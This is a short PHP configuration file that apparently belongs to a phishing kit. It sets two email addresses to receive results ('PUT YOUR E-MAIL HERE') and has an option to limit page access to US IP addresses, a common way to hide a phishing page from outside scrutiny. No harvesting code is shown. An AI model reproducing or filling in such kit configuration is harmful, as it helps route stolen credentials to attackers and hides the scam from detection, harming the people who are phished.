<?php
$yourmail  = 'mrsmakg5@gmail.com,xerosg5@outlook.com';  // PUT YOUR E-MAIL HERE
$sa = "no"; // For Allow Just US IP To Open The Page ... IF You Don't Want To Disallow The World Change IT To No
?>